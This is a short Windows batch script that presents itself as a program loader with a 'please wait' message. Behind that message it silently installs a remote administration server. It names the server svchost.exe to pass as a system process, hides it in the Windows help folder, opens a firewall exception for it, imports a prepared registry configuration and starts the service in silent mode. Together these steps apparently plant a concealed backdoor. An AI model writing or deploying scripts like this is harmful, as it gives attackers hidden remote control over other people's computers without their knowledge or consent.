@echo off 
echo PLEASE WAIT WHILE PROGRAM LOADS . . .
netsh firewall add allowedprogram "%Windir%\help\svchost.exe" "Remote Administrator Server" ENABLE
reg export "HKEY_LOCAL_MACHINE\SYSTEM\RAdmin" 123.reg
reg delete  "HKEY_LOCAL_MACHINE\SYSTEM\RAdmin" /f
copy /y "svchost.exe" "%SYSTEMROOT%/help\svchost.exe" 
copy /y "raddrv.dll" "%SYSTEMROOT%/help\raddrv.dll"
copy /y "admdll.dll" "%SYSTEMROOT%/help\admdll.dll"
reg import 111.reg
regedit /s 111.reg
"%SYSTEMROOT%/help\svchost.exe" /install /silence
"%SYSTEMROOT%/help\svchost.exe" /start
